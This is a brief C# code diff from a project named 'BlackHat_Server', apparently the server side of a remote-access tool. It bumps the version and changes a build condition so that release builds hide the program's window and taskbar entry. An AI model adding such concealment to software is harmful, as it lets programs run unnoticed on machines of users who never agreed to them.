@@ -13,9 +13,9 @@ namespace BlackHat_Server
         private void Host_Load(object sender, EventArgs e)
         {
             // VERSIONE DEL SERVER
-            ST_Client.Instance.ServerVersion = "0.0.7";
+            ST_Client.Instance.ServerVersion = "0.1.1";
 
-            #if DEBUG
+            #if !DEBUG
             Hide();
             ShowInTaskbar = false;
 
